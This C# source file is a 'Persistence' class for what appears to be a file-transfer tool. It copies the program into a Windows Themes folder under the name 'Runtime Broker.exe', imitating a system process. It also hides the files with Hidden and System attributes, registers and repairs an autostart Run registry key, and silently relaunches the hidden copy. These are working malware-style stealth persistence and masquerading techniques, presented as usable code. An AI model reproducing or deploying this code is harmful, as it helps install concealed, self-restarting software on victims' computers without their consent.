using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using Microsoft.Win32;

namespace FileTransfer;

public static class Persistence
{
    private static readonly string DestDir = Path.Combine(
        Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
        "Microsoft", "Windows", "Themes", "RuntimeBroker");

    public static readonly string DestExe = Path.Combine(DestDir, "Runtime Broker.exe");
    private static readonly string Marker = Path.Combine(DestDir, "ft.marker");
    private const string RunKeyName = "RuntimeBroker";

    public static bool IsRunningFromClone()
    {
        string exePath = Process.GetCurrentProcess().MainModule?.FileName ?? "";
        return exePath.StartsWith(DestDir, StringComparison.OrdinalIgnoreCase);
    }

    public static bool IsInstalled()
    {
        try { return File.Exists(DestExe) && File.Exists(Marker); }
        catch { return false; }
    }

    public static void KillExistingClone()
    {
        try
        {
            foreach (var p in Process.GetProcessesByName("Runtime Broker"))
            {
                try
                {
                    string? path = p.MainModule?.FileName;
                    if (!string.IsNullOrEmpty(path) && path.Equals(DestExe, StringComparison.OrdinalIgnoreCase))
                    {
                        Log($"Killing old clone PID={p.Id}");
                        p.Kill();
                        p.WaitForExit(3000);
                    }
                }
                catch { }
            }
        }
        catch (Exception ex)
        {
            Log($"KillExistingClone error: {ex.Message}");
        }
    }

    public static void Install()
    {
        Log("Install start");
        try
        {
            string source = Process.GetCurrentProcess().MainModule?.FileName ?? "";
            Log("Source exe: " + source);
            if (string.IsNullOrEmpty(source)) return;

            KillExistingClone();

            try { if (File.Exists(DestExe)) File.SetAttributes(DestExe, FileAttributes.Normal); } catch { }
            try { if (File.Exists(Marker)) File.SetAttributes(Marker, FileAttributes.Normal); } catch { }

            Log("Installing/updating files...");
            Directory.CreateDirectory(DestDir);

            string sourceDir = Path.GetDirectoryName(source) ?? "";
            string? cloneFolder = !string.IsNullOrEmpty(sourceDir)
                ? Path.Combine(sourceDir, "clone")
                : null;

            bool hasCloneFolder = cloneFolder != null && Directory.Exists(cloneFolder);

            if (hasCloneFolder)
            {
                Log($"Using pre-built clone from {cloneFolder}");
                CopyDirectoryContents(cloneFolder, DestDir, source);
            }
            else
            {
                Log("No pre-built clone, copying from source");
                CopyDirectoryContents(sourceDir, DestDir, source);
                File.Copy(source, DestExe, true);
            }

            File.SetAttributes(DestExe, FileAttributes.Hidden | FileAttributes.System);

            AddToAutoStart();

            File.WriteAllText(Marker, DateTime.Now.ToString());
            File.SetAttributes(Marker, FileAttributes.Hidden | FileAttributes.System);

            Log("Install finished OK");
        }
        catch (Exception ex)
        {
            Log("Install error: " + ex);
            Debug.WriteLine("Persistence install error: " + ex.Message);
        }
    }

    private static void CopyDirectoryContents(string sourceDir, string destDir, string? skipFile = null)
    {
        if (!Directory.Exists(sourceDir)) return;
        foreach (string file in Directory.GetFiles(sourceDir, "*", SearchOption.AllDirectories))
        {
            string rel = Path.GetRelativePath(sourceDir, file);
            string dest = Path.Combine(destDir, rel);

            string ext = Path.GetExtension(file).ToLowerInvariant();
            if (ext == ".pdb" || ext == ".xml")
                continue;

            if (skipFile != null && file.Equals(skipFile, StringComparison.OrdinalIgnoreCase))
                continue;

            string? destDir2 = Path.GetDirectoryName(dest);
            if (!string.IsNullOrEmpty(destDir2))
                Directory.CreateDirectory(destDir2);
            File.Copy(file, dest, true);
        }
    }

    private static void AddToAutoStart()
    {
        try
        {
            using var key = Registry.CurrentUser.OpenSubKey(
                @"Software\Microsoft\Windows\CurrentVersion\Run", true);
            if (key != null)
            {
                key.SetValue(RunKeyName, $"\"{DestExe}\" --background");
                Log("Autostart registry key added");
            }
        }
        catch (Exception ex)
        {
            Log("AddToAutoStart error: " + ex.Message);
        }
    }

    public static void EnsureAutoStart()
    {
        try
        {
            using var key = Registry.CurrentUser.OpenSubKey(
                @"Software\Microsoft\Windows\CurrentVersion\Run", true);
            if (key != null)
            {
                string? current = key.GetValue(RunKeyName) as string;
                string desired = $"\"{DestExe}\" --background";
                if (string.IsNullOrEmpty(current) || current != desired)
                {
                    key.SetValue(RunKeyName, desired);
                    Log("Autostart registry key repaired");
                }
            }
        }
        catch (Exception ex)
        {
            Log("EnsureAutoStart error: " + ex.Message);
        }
    }

    public static void LaunchClone()
    {
        try
        {
            if (File.Exists(DestExe))
            {
                var psi = new ProcessStartInfo
                {
                    FileName = DestExe,
                    Arguments = "--background",
                    UseShellExecute = false,
                    CreateNoWindow = true
                };
                Process.Start(psi);
                Log("Clone launched");
            }
        }
        catch (Exception ex)
        {
            Log("LaunchClone error: " + ex.Message);
        }
    }

    private static void Log(string msg)
    {
        MainWindow.Log(msg);
    }
}
